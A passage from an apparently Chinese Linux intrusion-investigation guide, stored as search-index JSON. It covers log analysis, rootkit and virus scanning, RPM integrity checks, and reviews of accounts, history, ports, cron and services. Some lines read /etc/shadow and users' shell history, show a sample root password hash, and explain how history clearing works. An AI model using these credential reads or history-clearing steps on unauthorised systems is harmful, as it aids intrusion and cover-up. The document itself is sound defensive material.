\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 0x02 \u5de5\u5177\u7bc7 \u00b6 2.1 Rootkit\u67e5\u6740 \u00b6 chkrootkit \u7f51\u5740\uff1a http://www.chkrootkit.org \u4f7f\u7528\u65b9\u6cd5\uff1a wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #\u7f16\u8bd1\u5b8c\u6210\u6ca1\u6709\u62a5\u9519\u7684\u8bdd\u6267\u884c\u68c0\u67e5 ./chkrootkit rkhunter \u7f51\u5740\uff1a http://rkhunter.sourceforge.net \u4f7f\u7528\u65b9\u6cd5\uff1a Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 2.2 \u75c5\u6bd2\u67e5\u6740 \u00b6 Clamav \u7f51\u5740\uff1a http://www.clamav.net/download.html \u5b89\u88c5\u65b9\u5f0f\u4e00\uff1a 1\u3001\u5b89\u88c5 zlib\uff1a wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #\u5b89\u88c5\u4e00\u4e0bgcc\u7f16\u8bd1\u73af\u5883\uff1a yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make && make install 2\u3001\u6dfb\u52a0\u7528\u6237\u7ec4 clamav \u548c\u7ec4\u6210\u5458 clamav\uff1a groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3\u3001\u5b89\u88c5 Clamav tar \u2013zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4\u3001\u914d\u7f6e Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5\u3001ClamAV \u4f7f\u7528\uff1a /opt/clamav/bin/freshclam \u5347\u7ea7\u75c5\u6bd2\u5e93 ./clamscan \u2013h \u67e5\u770b\u76f8\u5e94\u7684\u5e2e\u52a9\u4fe1\u606f ./clamscan -r /home \u626b\u63cf\u6240\u6709\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5c31\u4f7f\u7528 ./clamscan -r --bell -i /bin \u626b\u63cfbin\u76ee\u5f55\u5e76\u4e14\u663e\u793a\u6709\u95ee\u9898\u7684\u6587\u4ef6\u7684\u626b\u63cf\u7ed3\u679c \u5b89\u88c5\u65b9\u5f0f\u4e8c\uff1a #\u5b89\u88c5 yum install -y clamav #\u66f4\u65b0\u75c5\u6bd2\u5e93 freshclam #\u626b\u63cf\u65b9\u6cd5 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #\u626b\u63cf\u5e76\u6740\u6bd2 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #\u67e5\u770b\u65e5\u5fd7\u53d1\u73b0 cat /root/usrclamav.log |grep FOUND 2.3 webshell\u67e5\u6740 \u00b6 Linux \u7248\uff1a \u6cb3\u9a6c WebShell \u67e5\u6740\uff1ahttp://www.shellpub.com 2.4 RPM check \u68c0\u67e5 \u00b6 \u7cfb\u7edf\u5b8c\u6574\u6027\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305\uff0c\u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u4e86\uff1a ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\uff0c\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\uff0c\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \uff0c\u5982\u679c\u662f. (\u70b9) \u5219\u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002 \u9a8c\u8bc1\u5185\u5bb9\u4e2d\u76848\u4e2a\u4fe1\u606f\u7684\u5177\u4f53\u5185\u5bb9\u5982\u4e0b\uff1a S \u6587\u4ef6\u5927\u5c0f\u662f\u5426\u6539\u53d8 M \u6587\u4ef6\u7684\u7c7b\u578b\u6216\u6587\u4ef6\u7684\u6743\u9650\uff08rwx\uff09\u662f\u5426\u88ab\u6539\u53d8 5 \u6587\u4ef6MD5\u6821\u9a8c\u662f\u5426\u6539\u53d8\uff08\u53ef\u4ee5\u770b\u6210\u6587\u4ef6\u5185\u5bb9\u662f\u5426\u6539\u53d8\uff09 D \u8bbe\u5907\u4e2d\uff0c\u4ece\u4ee3\u7801\u662f\u5426\u6539\u53d8 L \u6587\u4ef6\u8def\u5f84\u662f\u5426\u6539\u53d8 U \u6587\u4ef6\u7684\u5c5e\u4e3b\uff08\u6240\u6709\u8005\uff09\u662f\u5426\u6539\u53d8 G \u6587\u4ef6\u7684\u5c5e\u7ec4\u662f\u5426\u6539\u53d8 T \u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6539\u53d8 \u5982\u679c\u547d\u4ee4\u88ab\u66ff\u6362\u4e86\uff0c\u5982\u679c\u8fd8\u539f\u56de\u6765\uff1a \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2 ls \u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp \u5148\u628a ls \u8f6c\u79fb\u5230 tmp \u76ee\u5f55\u4e0b\uff0c\u9020\u6210 ls \u547d\u4ee4\u4e22\u5931\u7684\u5047\u8c61 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6 rpm \u5305\u4e2d ls \u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684 /bin/ls \u4e0b cp /root/bin/ls /bin/ \u628a ls \u547d\u4ee4\u590d\u5236\u5230 /bin/ \u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 2.5 Linux\u5b89\u5168\u68c0\u67e5\u811a\u672c \u00b6 Github \u9879\u76ee\u5730\u5740\uff1a https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux \u5c3d\u4fe1\u4e66\u4e0d\u5982\u65e0\u4e66\uff0c\u5de5\u5177\u53ea\u662f\u8f85\u52a9\uff0c\u522b\u592a\u8fc7\u4e8e\u4f9d\u8d56\uff0c\u5173\u952e\u5728\u4e8e\u4f60\u5982\u4f55\u89e3\u51b3\u95ee\u9898\u7684\u601d\u8def\u3002","title":"\u7b2c2\u7bc7\uff1aLinux \u5165\u4fb5\u6392\u67e5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#\u7b2c2\u7bc7linux-\u5165\u4fb5\u6392\u67e5","text":"","title":"\u7b2c2\u7bc7\uff1aLinux \u5165\u4fb5\u6392\u67e5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x00-\u524d\u8a00","text":"\u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9b Linux \u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x01-\u5165\u4fb5\u6392\u67e5\u601d\u8def","text":"","title":"0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#11-\u8d26\u53f7\u5b89\u5168","text":"\u57fa\u672c\u4f7f\u7528\uff1a 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6 /etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540e\u7684 shell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6 /etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559 who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty \u672c\u5730\u767b\u9646 pts \u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d\u72b6\u6001 \u5165\u4fb5\u6392\u67e5\uff1a 1\u3001\u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2\u3001\u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3\u3001\u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4\u3001\u7981\u7528\u6216\u5220\u9664\u591a\u4f59\u53ca\u53ef\u7591\u7684\u5e10\u53f7 usermod -L user \u7981\u7528\u5e10\u53f7\uff0c\u5e10\u53f7\u65e0\u6cd5\u767b\u5f55\uff0c/etc/shadow \u7b2c\u4e8c\u680f\u4e3a ! \u5f00\u5934 userdel user \u5220\u9664 user \u7528\u6237 userdel -r user \u5c06\u5220\u9664 user \u7528\u6237\uff0c\u5e76\u4e14\u5c06 /home \u76ee\u5f55\u4e0b\u7684 user \u76ee\u5f55\u4e00\u5e76\u5220\u9664","title":"1.1 \u8d26\u53f7\u5b89\u5168"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#12-\u5386\u53f2\u547d\u4ee4","text":"\u57fa\u672c\u4f7f\u7528\uff1a \u901a\u8fc7 .bash_history \u6587\u4ef6\u67e5\u770b\u5e10\u53f7\u6267\u884c\u8fc7\u7684\u7cfb\u7edf\u547d\u4ee4 1\u3001root \u7528\u6237\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00 /home \u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684 .bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u6267\u884c\u7684\u5386\u53f2\u547d\u4ee4\u3002 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684 IP \u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a ######jiagu history xianshi######### USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3\uff09source /etc/profile \u8ba9\u914d\u7f6e\u751f\u6548 \u751f\u6210\u6548\u679c\uff1a 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3\u3001\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u7684\u6e05\u9664\uff1ahistory -c \u4f46\u6b64\u547d\u4ee4\u5e76\u4e0d\u4f1a\u6e05\u9664\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\uff0c\u56e0\u6b64\u9700\u8981\u624b\u52a8\u5220\u9664 .bash_profile \u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u8fdb\u5165\u7528\u6237\u76ee\u5f55\u4e0b\uff0c\u5bfc\u51fa\u5386\u53f2\u547d\u4ee4\u3002 cat .bash_history >> history.txt","title":"1.2 \u5386\u53f2\u547d\u4ee4"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#13-\u68c0\u67e5\u5f02\u5e38\u7aef\u53e3","text":"\u4f7f\u7528 netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID netstat -antlp | more \u67e5\u770b\u4e0b pid \u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884c ls -l /proc/$PID/exe \u6216 file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684 pid \u53f7\uff09","title":"1.3 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#14-\u68c0\u67e5\u5f02\u5e38\u8fdb\u7a0b","text":"\u4f7f\u7528 ps \u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid","title":"1.4 \u68c0\u67e5\u5f02\u5e38\u8fdb\u7a0b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#15-\u68c0\u67e5\u5f00\u673a\u542f\u52a8\u9879","text":"\u57fa\u672c\u4f7f\u7528\uff1a \u7cfb\u7edf\u8fd0\u884c\u7ea7\u522b\u793a\u610f\u56fe\uff1a \u8fd0\u884c\u7ea7\u522b \u542b\u4e49 0 \u5173\u673a 1 \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u53ef\u4ee5\u60f3\u8c61\u4e3awindows\u7684\u5b89\u5168\u6a21\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u7cfb\u7edf\u4fee\u590d 2 \u4e0d\u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u4e0d\u542bNFS\u670d\u52a1 3 \u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u5c31\u662f\u6807\u51c6\u5b57\u7b26\u754c\u9762 4 \u7cfb\u7edf\u4fdd\u7559 5 \u56fe\u5f62\u6a21\u5f0f 6 \u91cd\u542f\u52a8 \u67e5\u770b\u8fd0\u884c\u7ea7\u522b\u547d\u4ee4 runlevel \u7cfb\u7edf\u9ed8\u8ba4\u5141\u8bb8\u7ea7\u522b vi /etc/inittab id=3\uff1ainitdefault #\u7cfb\u7edf\u5f00\u673a\u540e\u76f4\u63a5\u8fdb\u5165\u54ea\u4e2a\u8fd0\u884c\u7ea7\u522b \u5f00\u673a\u542f\u52a8\u914d\u7f6e\u6587\u4ef6 /etc/rc.local /etc/rc.d/rc[0~6].d \u4f8b\u5b50\uff1a\u5f53\u6211\u4eec\u9700\u8981\u5f00\u673a\u542f\u52a8\u81ea\u5df1\u7684\u811a\u672c\u65f6\uff0c\u53ea\u9700\u8981\u5c06\u53ef\u6267\u884c\u811a\u672c\u4e22\u5728 /etc/init.d \u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u5728 /etc/rc.d/rc*.d \u6587\u4ef6\u4e2d\u5efa\u7acb\u8f6f\u94fe\u63a5\u5373\u53ef\u3002 \u6ce8\uff1a\u6b64\u4e2d\u7684 * \u4ee3\u8868 0,1,2,3,4,5,6 \u8fd9\u4e03\u4e2a\u7b49\u7ea7 root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh \u6b64\u5904sshd\u662f\u5177\u4f53\u670d\u52a1\u7684\u811a\u672c\u6587\u4ef6\uff0cS100ssh\u662f\u5176\u8f6f\u94fe\u63a5\uff0cS\u5f00\u5934\u4ee3\u8868\u52a0\u8f7d\u65f6\u81ea\u542f\u52a8\uff1b\u5982\u679c\u662fK\u5f00\u5934\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4ee3\u8868\u8fd0\u884c\u7ea7\u522b\u52a0\u8f7d\u65f6\u9700\u8981\u5173\u95ed\u7684\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u542f\u52a8\u9879\u6587\u4ef6\uff1a more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/","title":"1.5 \u68c0\u67e5\u5f00\u673a\u542f\u52a8\u9879"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#16-\u68c0\u67e5\u5b9a\u65f6\u4efb\u52a1","text":"\u57fa\u672c\u4f7f\u7528 1\u3001\u5229\u7528 crontab \u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l \u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a*/1 * * * * echo \"hello world\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528 anacron \u547d\u4ee4\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh \u811a\u672c\uff1a vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002 \u5165\u4fb5\u6392\u67e5 \u91cd\u70b9\u5173\u6ce8\u4ee5\u4e0b\u76ee\u5f55\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f\u811a\u672c /var/spool/cron/* /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab /var/spool/anacron/* \u5c0f\u6280\u5de7\uff1a more /etc/cron.daily/* \u67e5\u770b\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6","title":"1.6 \u68c0\u67e5\u5b9a\u65f6\u4efb\u52a1"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#17-\u68c0\u67e5\u670d\u52a1","text":"\u670d\u52a1\u81ea\u542f\u52a8 \u7b2c\u4e00\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a chkconfig [--level \u8fd0\u884c\u7ea7\u522b] [\u72ec\u7acb\u670d\u52a1\u540d] [on|off] chkconfig \u2013level 2345 httpd on \u5f00\u542f\u81ea\u542f\u52a8 chkconfig httpd on \uff08\u9ed8\u8ba4level\u662f2345\uff09 \u7b2c\u4e8c\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4fee\u6539 /etc/re.d/rc.local \u6587\u4ef6 \u52a0\u5165 /etc/init.d/httpd start \u7b2c\u4e09\u79cd\u4fee\u6539\u65b9\u6cd5\uff1a \u4f7f\u7528 ntsysv \u547d\u4ee4\u7ba1\u7406\u81ea\u542f\u52a8\uff0c\u53ef\u4ee5\u7ba1\u7406\u72ec\u7acb\u670d\u52a1\u548c xinetd \u670d\u52a1\u3002 \u5165\u4fb5\u6392\u67e5 1\u3001\u67e5\u8be2\u5df2\u5b89\u88c5\u7684\u670d\u52a1\uff1a RPM \u5305\u5b89\u88c5\u7684\u670d\u52a1 chkconfig --list \u67e5\u770b\u670d\u52a1\u81ea\u542f\u52a8\u72b6\u6001\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684RPM\u5305\u5b89\u88c5\u7684\u670d\u52a1 ps aux | grep crond \u67e5\u770b\u5f53\u524d\u670d\u52a1 \u7cfb\u7edf\u57283\u4e0e5\u7ea7\u522b\u4e0b\u7684\u542f\u52a8\u9879 \u4e2d\u6587\u73af\u5883 chkconfig --list | grep \"3:\u542f\u7528\\|5:\u542f\u7528\" \u82f1\u6587\u73af\u5883 chkconfig --list | grep \"3:on\\|5:on\" \u6e90\u7801\u5305\u5b89\u88c5\u7684\u670d\u52a1 \u67e5\u770b\u670d\u52a1\u5b89\u88c5\u4f4d\u7f6e \uff0c\u4e00\u822c\u662f\u5728/user/local/ service httpd start \u641c\u7d22/etc/rc.d/init.d/ \u67e5\u770b\u662f\u5426\u5b58\u5728","title":"1.7 